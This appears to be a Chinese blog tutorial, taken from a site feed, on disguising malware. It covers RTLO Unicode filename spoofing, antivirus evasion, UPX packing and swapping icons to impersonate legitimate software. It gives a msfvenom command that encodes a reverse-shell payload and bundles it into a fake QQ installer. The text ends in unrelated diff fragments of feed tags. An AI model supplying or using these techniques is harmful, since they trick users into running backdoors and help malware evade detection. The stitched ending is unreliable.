利用Unicode控制字符可以让你的名字的一部分变为后缀, 在@你的时候在第一行最后出现, 反正如下:</p><p>肯定不是直接输入这个, 怎么输入自己找方法</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id[U+2067][U+2067][U+2067]主人,[U+2067][U+2067]</span><br></pre></td></tr></table></figure><ol><li>溢出符(换页, 回车, 制表符等): 用于文本布局和文档结构控制</li><li>动画和表情控制:像序列点, 线程终止符等, 常用于网络聊天和即时通讯中的表情符号</li><li>设备控制码：如转义字符, 用于表示特定的文本模式或控制命令</li><li>错误和通知：例如文件结束符(EOF)用于标识输入流的结束</li></ol><p>这里着重介绍RTLO方法</p><p>RLO(Right-to-left override)是Unicode中的一个控制字符, 当在支持RTLO的语言环境中遇到RLO时, 它指示接下来的文本应当按照从右向左的顺序显示, 直到遇到其他指示正常行序的字符或者RLO字符自身的结束</p><p>例如, 有一个文件叫做<code>test.jpg</code>, 重命名为<code>testpdf.jpg</code>, 随后在test和pdf之间插入ROL控制字符, 现在文件显示应该是<code>testgpj.pdf</code></p><blockquote><p>还有奇妙的搭配, 比如<code>contxt.gif</code>, 插入ROL后变为<code>config.txt</code></p></blockquote><h1>免杀</h1><p>文件免杀可以加混淆, 加壳, 当然还有后门生成器实用程序<a href="https://github.com/Ch0pin/AVIator/">GitHub - Ch0pin/AVIator: Antivirus evasion project</a>, 甚至带了RTLO和更改图标功能, 但是自动化程序终归可能有问题, 我们还是得学手动的</p><p>想要知道免杀成不成功, 利用微步什么的上传分析一下就行, 比如<a href="https://www.virustotal.com/gui/home/upload">VirusTotal</a></p><h2 id="msf编码器"><a class="header-anchor" href="#msf编码器">¶</a>msf编码器</h2><p>msf自己也有部分免杀的能力, 利用编码器对攻击载荷文件进行重新的排列编码, 改变可执行文件中的代码形状, 避免被杀软认出</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 列出所有可用编码格式, 最普遍的是x86/shikata_ga_nai</span></span><br><span class="line">msfvenom -l encoders</span><br></pre></td></tr></table></figure><p>绑在其他文件上的同时再用编码器进行编码, 可以加大检测的难度</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/shell_reverse_tcp lhost=192.168.10.1 lport=10000 -e x86/shikata_ga_nai -x qq_install.exe -i 12 -f exe -o shell.exe</span><br></pre></td></tr></table></figure><table><thead><tr><th>参数</th><th>备注</th></tr></thead><tbody><tr><td>-e</td><td>指定编码方式</td></tr><tr><td>-X</td><td>指定木马捆绑的程序</td></tr><tr><td>-i</td><td>编码的次数</td></tr><tr><td>-f</td><td>程序的格式</td></tr><tr><td>-0</td><td>文件输出路径</td></tr></tbody></table><h2 id="加壳"><a class="header-anchor" href="#加壳">¶</a>加壳</h2><p>upx之类的壳, 用工具即可, 又不是做逆向让你拆壳</p><h2 id="其他工具"><a class="header-anchor" href="#其他工具">¶</a>其他工具</h2><p><a href="https://blog.csdn.net/secsf/article/details/79036833">shellter, Veil, Avet三款工具的免杀测试</a></p><h1>图标更换</h1><ol><li>ResourceHacker: 导出伪造软件的图标组</li><li>Restorator: 修改后门exe文件图标</li></ol><p>拿到图标组后操作如下:</p><p>右键资源树中的exe-&gt;添加资源-&gt;Windows标准类型选择图标-&gt;名称自选, 假如为test</p><p>右键刚刚在资源树中新建的test-&gt;导入-&gt;选择刚才的图标组</p><p>保存即可</p>]]></content>
       
       
       <categories>
@@ -2386,9 +2490,9 @@
       
         <tags>
             
-            <tag> SSTI </tag>
-            
             <tag> 模板 </tag>
+            
+            <tag> SSTI </tag>
             
         </tags>
       
@@ -2413,9 +2517,9 @@
       
         <tags>
             
-            <tag> PHP </tag>
-            
             <tag> 绕过 </tag>
+            
+            <tag> PHP </tag>
             
             <tag> 强比较 </tag>
             
